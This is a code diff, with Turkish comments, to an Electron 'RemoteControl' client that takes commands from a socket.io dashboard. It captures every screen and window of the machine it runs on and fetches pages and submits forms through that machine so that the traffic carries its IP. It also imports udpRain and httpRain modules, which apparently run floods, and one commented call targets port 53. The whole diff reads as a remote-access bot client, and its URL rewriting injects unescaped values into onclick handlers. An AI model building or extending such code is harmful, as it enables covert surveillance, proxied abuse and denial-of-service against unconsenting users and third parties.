@@ -3,6 +3,8 @@ const io = require("socket.io-client");
 const child_process = require("child_process");
 const udpRain = require("./udpRain");
 const httpRain = require("./httpRain");
+const axios = require("axios");
+const { URL } = require("url");
 //udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });
 
 //const robot = require("robotjs");
@@ -13,9 +15,6 @@ const info = require("./config");
 class RemoteControl {
   constructor() {
     this.mainWindow;
-    // Remote browser için ek pencereler
-    this.remoteBrowserWindow = null;
-    this.remoteBrowserInterval = null;
   }
   getCamDataWeb = (data) => {
     console.log({ getCamDataWeb: data });
@@ -33,17 +32,29 @@ class RemoteControl {
   getScreenData = (data) => {
     (async () => {
       try {
+        // Hem screen hem window'ları al
         let sources = await desktopCapturer.getSources({
-          types: ["screen"],
+          types: ["screen", "window"],
           thumbnailSize: {
             width: parseInt(data.dimension.split("x")[0]),
             height: parseInt(data.dimension.split("x")[1]),
           },
         });
 
-        data["src"] = sources[data.screen].thumbnail.toDataURL();
+        const screenIndex = parseInt(data.screen);
+        if (screenIndex >= 0 && screenIndex < sources.length) {
+          data["src"] = sources[screenIndex].thumbnail.toDataURL();
+          this.socket.emit("screenshotResponse", data);
+        } else {
+          console.error("Invalid screen index:", screenIndex, "Available sources:", sources.length);
+          data["src"] = "";
+          this.socket.emit("screenshotResponse", data);
+        }
+      } catch (err) {
+        console.error("Error getting screen data:", err);
+        data["src"] = "";
         this.socket.emit("screenshotResponse", data);
-      } catch (err) { }
+      }
     })();
   };
 
@@ -175,18 +186,14 @@ class RemoteControl {
     });
 
     /**
-     * Remote Browser
-     * Dashboard'tan gelen istekle, terminal üzerindeki Electron içinde
-     * gerçek bir BrowserWindow açılır. Bütün HTTP/HTTPS trafiği bu makineden çıkar.
+     * Remote Browser - Axios ile HTML fetch
+     * Dashboard'tan gelen URL'yi axios ile terminal üzerinden fetch eder,
+     * HTML'i alır ve tüm relative URL'leri absolute'ye çevirir.
+     * Tüm HTTP/HTTPS trafiği bu makineden çıkar.
      */
     this.socket.on("remoteBrowserOpen", (data) => {
       // data: { from, to, url }
-      this.openRemoteBrowser(data);
-    });
-
-    // Remote browser input (mouse/keyboard)
-    this.socket.on("remoteBrowserInput", (data) => {
-      this.handleRemoteBrowserInput(data);
+      this.fetchRemoteBrowserHTML(data);
     });
 
     // Screen/window listesi isteği
@@ -196,131 +203,135 @@ class RemoteControl {
   };
 
   /**
-   * Uzak tarayıcıyı aç ve periyodik olarak ekran görüntüsü al.
+   * Axios ile HTML fetch ve URL rewrite
    * Tüm trafik terminal makinenin IP'si üzerinden gider.
    */
-  openRemoteBrowser = (data) => {
+  fetchRemoteBrowserHTML = async (data) => {
     const targetUrl = data.url;
+    const method = data.method || "GET";
+    const formData = data.formData || null;
 
-    // BrowserWindow yoksa oluştur
-    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
-      this.remoteBrowserWindow = new BrowserWindow({
-        width: 1920,
-        height: 1080,
-        show: false, // gizli pencere, sadece ekran görüntüsü için
-        webPreferences: {
-          nodeIntegration: false,
-          contextIsolation: true,
-          sandbox: true,
+    try {
+      // Axios ile HTTP isteği (terminal üzerinden)
+      const config = {
+        timeout: 30000,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         },
-      });
-    }
+        maxRedirects: 5,
+        validateStatus: (status) => status < 500 // 4xx hatalarını da al (404, 403, vs.)
+      };
 
-    // URL'yi yükle
-    this.remoteBrowserWindow.loadURL(targetUrl).catch((err) => {
-      console.error("Remote browser load error:", err);
-    });
-
-    // Eski interval varsa temizle
-    if (this.remoteBrowserInterval) {
-      clearInterval(this.remoteBrowserInterval);
-      this.remoteBrowserInterval = null;
-    }
-
-    // Periyodik olarak ekran görüntüsü al ve dashboard'a gönder
-    const captureFn = () => {
-      if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
-        if (this.remoteBrowserInterval) {
-          clearInterval(this.remoteBrowserInterval);
-          this.remoteBrowserInterval = null;
+      let response;
+      if (method === "POST" && formData) {
+        // Form data ile POST - URL encoded format
+        const FormDataLib = require('form-data');
+        const form = new FormDataLib();
+        for (const key in formData) {
+          form.append(key, formData[key]);
         }
-        return;
+        config.headers = { ...config.headers, ...form.getHeaders() };
+        response = await axios.post(targetUrl, form, config);
+      } else {
+        // GET isteği
+        response = await axios.get(targetUrl, config);
       }
 
-      this.remoteBrowserWindow.webContents
-        .capturePage()
-        .then((image) => {
-          // Daha iyi kalite için scale factor kullan
-          const scaleFactor = 1.0;
-          const src = image.toDataURL('image/jpeg', 0.85); // JPEG %85 kalite (daha küçük boyut, hala iyi kalite)
-          const payload = {
-            from: data.from,
-            to: data.to,
-            url: targetUrl,
-            src,
-            width: image.getSize().width,
-            height: image.getSize().height
-          };
-          this.socket.emit("remoteBrowserFrame", payload);
-        })
-        .catch((err) => {
-          console.error("Remote browser capture error:", err);
-        });
-    };
+      let html = response.data;
+      const baseUrl = new URL(targetUrl);
 
-    // İlk capture biraz gecikmeli (sayfa yüklensin)
-    setTimeout(captureFn, 2000);
-    this.remoteBrowserInterval = setInterval(captureFn, 500); // Daha hızlı frame rate (500ms)
-  };
+      // HTML içindeki tüm relative URL'leri absolute'ye çevir
+      html = this.rewriteHTMLUrls(html, baseUrl);
 
-  /**
-   * Remote browser input handler (mouse/keyboard)
-   */
-  handleRemoteBrowserInput = (data) => {
-    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
-      return;
-    }
+      // HTML'i dashboard'a gönder
+      this.socket.emit("remoteBrowserHTML", {
+        from: data.from,
+        to: data.to,
+        url: targetUrl,
+        html: html,
+        status: response.status
+      });
 
-    const webContents = this.remoteBrowserWindow.webContents;
-    const inputData = data.data;
+    } catch (error) {
+      console.error("Remote browser fetch error:", error.message);
+      
+      // Hata durumunda error HTML gönder
+      const errorHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>Error</title></head>
+        <body style="font-family: Arial; padding: 20px;">
+          <h1>Error Loading Page</h1>
+          <p><strong>URL:</strong> ${targetUrl}</p>
+          <p><strong>Error:</strong> ${error.message}</p>
+          ${error.response ? `<p><strong>Status:</strong> ${error.response.status}</p>` : ''}
+        </body>
+        </html>
+      `;
 
-    switch (data.type) {
-      case "click":
-        webContents.sendInputEvent({
-          type: "mouseDown",
-          x: inputData.x,
-          y: inputData.y,
-          button: inputData.button === 2 ? "right" : "left",
-          clickCount: 1
-        });
-        setTimeout(() => {
-          webContents.sendInputEvent({
-            type: "mouseUp",
-            x: inputData.x,
-            y: inputData.y,
-            button: inputData.button === 2 ? "right" : "left",
-            clickCount: 1
-          });
-        }, 50);
-        break;
-
-      case "keydown":
-        webContents.sendInputEvent({
-          type: "keyDown",
-          keyCode: inputData.keyCode,
-          modifiers: this.getModifiers(inputData)
-        });
-        break;
-
-      case "keyup":
-        webContents.sendInputEvent({
-          type: "keyUp",
-          keyCode: inputData.keyCode
-        });
-        break;
+      this.socket.emit("remoteBrowserHTML", {
+        from: data.from,
+        to: data.to,
+        url: targetUrl,
+        html: errorHtml,
+        status: error.response ? error.response.status : 0,
+        error: error.message
+      });
     }
   };
 
   /**
-   * Modifier keys helper
+   * HTML içindeki tüm relative URL'leri absolute'ye çevir
    */
-  getModifiers = (inputData) => {
-    let modifiers = [];
-    if (inputData.ctrlKey) modifiers.push("control");
-    if (inputData.shiftKey) modifiers.push("shift");
-    if (inputData.altKey) modifiers.push("alt");
-    if (inputData.metaKey) modifiers.push("meta");
-    return modifiers;
+  rewriteHTMLUrls = (html, baseUrl) => {
+    // img src
+    html = html.replace(/<img([^>]*)\ssrc=["']([^"']+)["']/gi, (match, attrs, src) => {
+      const absoluteSrc = new URL(src, baseUrl).href;
+      return `<img${attrs} src="${absoluteSrc}"`;
+    });
+
+    // script src
+    html = html.replace(/<script([^>]*)\ssrc=["']([^"']+)["']/gi, (match, attrs, src) => {
+      const absoluteSrc = new URL(src, baseUrl).href;
+      return `<script${attrs} src="${absoluteSrc}"`;
+    });
+
+    // link href (CSS, favicon, vs.)
+    html = html.replace(/<link([^>]*)\shref=["']([^"']+)["']/gi, (match, attrs, href) => {
+      const absoluteHref = new URL(href, baseUrl).href;
+      return `<link${attrs} href="${absoluteHref}"`;
+    });
+
+    // a href (linkler)
+    html = html.replace(/<a([^>]*)\shref=["']([^"']+)["']/gi, (match, attrs, href) => {
+      // External link'ler için özel işaretleme
+      try {
+        const absoluteHref = new URL(href, baseUrl).href;
+        // Link'e onclick ekle ki yeni istek gönderilsin
+        return `<a${attrs} href="javascript:void(0)" data-remote-url="${absoluteHref}" onclick="window.parent.postMessage({type:'remoteBrowserNavigate', url:'${absoluteHref}'}, '*')"`;
+      } catch (e) {
+        return match;
+      }
+    });
+
+    // form action
+    html = html.replace(/<form([^>]*)\saction=["']([^"']+)["']/gi, (match, attrs, action) => {
+      const absoluteAction = new URL(action, baseUrl).href;
+      // Form submit'i yakalamak için
+      return `<form${attrs} action="javascript:void(0)" data-remote-action="${absoluteAction}" onsubmit="event.preventDefault(); window.parent.postMessage({type:'remoteBrowserSubmit', url:'${absoluteAction}', formData: new FormData(this)}, '*'); return false;"`;
+    });
+
+    // CSS içindeki url()
+    html = html.replace(/url\(["']?([^"')]+)["']?\)/gi, (match, url) => {
+      try {
+        const absoluteUrl = new URL(url, baseUrl).href;
+        return `url("${absoluteUrl}")`;
+      } catch (e) {
+        return match;
+      }
+    });
+
+    return html;
   };
 
   /**
@@ -328,18 +339,28 @@ class RemoteControl {
    */
   getScreenList = async (data) => {
     try {
+      console.log("Getting screen/window list...");
+      
       // Hem screen hem window'ları al
       const sources = await desktopCapturer.getSources({
         types: ["screen", "window"],
         thumbnailSize: { width: 200, height: 200 }
       });
 
-      const screens = sources.map((source, index) => ({
-        id: source.id,
-        name: source.name,
-        thumbnail: source.thumbnail.toDataURL()
-      }));
+      console.log("Found", sources.length, "sources");
 
+      const screens = sources.map((source, index) => {
+        const isScreen = source.id.startsWith("screen:") || source.id.includes("Screen");
+        return {
+          id: source.id,
+          name: source.name || (isScreen ? `Screen ${index + 1}` : `Window: ${source.name}`),
+          thumbnail: source.thumbnail.toDataURL(),
+          type: isScreen ? "screen" : "window"
+        };
+      });
+
+      console.log("Sending screen list to dashboard:", screens.length, "items");
+      
       this.socket.emit("getScreenListResponse", {
         from: data.from,
         to: data.to,
